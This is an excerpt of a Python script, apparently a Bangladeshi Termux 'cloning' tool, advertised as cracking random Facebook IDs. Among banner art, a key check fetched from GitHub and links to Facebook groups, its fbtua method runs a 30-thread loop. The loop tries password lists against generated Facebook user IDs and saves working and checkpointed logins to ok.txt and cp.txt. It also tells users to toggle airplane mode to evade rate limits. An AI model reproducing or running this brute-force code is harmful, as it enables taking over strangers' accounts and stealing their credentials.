...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Md Humayun\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :5.0\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
 """)
def logo2():
# ekhane apnar logo diben
	print ("""
   

  _    _ _    _ __  __ _  ___     ___    _  ___  
 | |  | | |  | |  \/  | || \ \   / / |  | |/ _ \ 
 | |__| | |  | | \  / | || |\ \_/ /| |  | | (_) |
 |  __  | |  | | |\/| |__   _\   / | |  | |\__, |
 | |  | | |__| | |  | |  | |  | |  | |__| |  / / 
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :5.0\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Md Humayun Kobir \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : HUM4YU9 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : HUMAYUN.KOBIR.OFFICIAL.04 \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/HUM4YU9/paid1.txt/main/README.md"]).text
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/HUMAYUN.KOBIR.OFFICIAL.04")
...
def notice():
	...
	runtxt("\n\033[0;97m  Paid cloning Tool For Free Aproval Join Group ")
	os.system("xdg-open https://www.facebook.com/groups/the.king.c.s.j/permalink/642142930903266/?app=fbl")
	runtxt("\033[0;97m Key Approval Er Jonno Group A Join Koroh>> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Key group admin er post a comment koroh")
	os.system("xdg-open https://www.facebook.com/groups/the.king.c.s.j/permalink/642142930903266/?app=fbl")
	subprocess.check_output(["am", "start", "https://facebook.com/groups/the.king.c.s.j/"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://raw.githubusercontent.com/HUM4YU9/paid1.txt/main/README.md').text
			if basesplit in plr:
				key = basesplit
 ...
 |_|  |_|\____/|_|  |_|  |_|  |_|   \____/  /_/  
                                      ...
                                      M4ST3R M1ND                                     
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Md Humayun Kobir\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 5.0\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Md Humayun Kobir \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : HUM4YU9 \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCcT8d2FnQUqJ3okOIZ4YP7g"])
		print("───────────────────────────────────────────────────────× ")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-11 {JUST NOW} %s(Paid)"%(G,R,G,Y,B))
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : HAR 10 MIN BAD AIRPLAN MOD/FLIGHT MOD ON KOROH ")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=HUM4YU9=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=HUM4YU9=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=HUM4YU9=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=HUM4YU9=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("")
		print("\n [*] Author    :  MD Humayun Kobir")
		print(" [*] Team      :  Cyber Security Jamalpur\n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://www.facebook.com/HUMAYUN.KOBIR.OFFICIAL.04/ ")
		print(" [*] Instagram : https://instagram.com/ ")
		print(" [*] YouTube   : Technical Ryan BD/ ")
